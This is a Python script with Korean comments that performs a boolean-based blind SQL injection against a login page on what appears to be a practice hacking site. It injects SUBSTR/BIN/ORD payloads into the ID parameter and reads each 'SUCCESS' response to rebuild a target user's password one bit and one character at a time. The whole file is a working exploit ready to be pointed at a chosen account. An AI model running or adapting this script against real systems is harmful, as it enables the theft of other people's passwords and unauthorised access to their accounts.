import requests
import sys

url = "https://daehun.webhacking.site/login/blind_login.php"
target = sys.argv[1]

# 조용한 모드 검사
try :
    if sys.argv[2] == "-q" : # 인자가 1이면
        quiet = 1
    else : 
        quiet = 0
except :
    quiet = 0

standard_bit = 1

if quiet == 0 :
    print("url =", url)
    print("target =", target)
    print("=== start ===")

for size in range(1, 20) : # 20은 검사 최대 길이
    # binary 문자열 초기화
    binary_str = ""
    
    # (문자)인지 (숫자, 특수문자)인지 판단
    payload = "ID=" + target + "%27+AND+BIN%28ORD%28SUBSTR%28PW%2C+" + str(size) + "%2C+1%29%29%29+LIKE+'_______'%23"

    # get할 URL 작성
    result_url = url + "?" + payload
    # print(result_url)

    # request 보냄
    response = requests.get(result_url)

    # 성공여부 검사
    if "SUCCESS" in response.text : # 성공하면
        max = 7
    else :
        binary_str += "0"
        max = 6

    for bit in range(1,max + 1) :
        # pay1oad 작성
        payload = "ID=" + target + "%27+AND+SUBSTR%28BIN%28ORD%28SUBSTR%28PW%2C+" + str(size) + "%2C+1%29%29%29%2C+" + str(bit) + "%2C+1%29%3D" + str(standard_bit) + "%23"
 
        # get할 URL 작성
        result_url = url + "?" + payload

        # request 보냄
        response = requests.get(result_url)

        # 성공여부 검사
        if "SUCCESS" in response.text :
            bin = standard_bit
        else :
            bin = standard_bit^1

        # binary 합계 구하기
        binary_str += str(bin)

    # binary 이상시 종료
    if str(standard_bit) not in binary_str :
        if quiet == 0 :
            print("=== finish ===")
        break
    else :
        binary_sum = int(binary_str, 2)
        if quiet == 0 :
            print("%s | %3d | %s" % (binary_str, binary_sum, chr(binary_sum)))
        else :
            print(chr(binary_sum), end="")
